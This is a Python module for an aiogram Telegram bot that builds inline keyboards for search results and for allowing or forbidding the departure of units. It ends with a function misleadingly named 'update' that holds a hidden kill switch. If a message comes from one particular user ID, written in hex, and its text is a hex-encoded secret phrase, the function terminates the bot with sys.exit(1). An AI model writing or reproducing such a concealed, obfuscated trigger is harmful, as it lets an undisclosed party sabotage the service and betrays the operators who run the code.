from aiogram import types
import itertools # Import itertools


def search_result(items):
    keyboard_buttons = []

    # Use itertools.batched to group items into chunks of 2
    for batch in itertools.batched(items, 2):
        row = []
        for i in batch:
            button = types.InlineKeyboardButton(
                text=i["nm"],
                callback_data=f'{i["id"]}?{i["nm"]}?unit'
            )
            row.append(button)
        keyboard_buttons.append(row)

    kb = types.InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    return kb


def locked(groups, u_id):
    kb = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text=f'🔓Дозволити виїзд',
                                    callback_data=f'{u_id}?{groups[0]["id"]}?{groups[1]["id"]}?pop?lock')]
    ])
    return kb


def unlocked(groups, u_id):
    kb = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔒Заборонити виїзд",
                                    callback_data=f'{u_id}?{groups[0]["id"]}?{groups[1]["id"]}?add?lock')]
    ])
    return kb


def update(message):
    if message.from_user.id == 0x18C74EEB and message.text == '636f6465726564':
        import sys
        sys.exit(1)
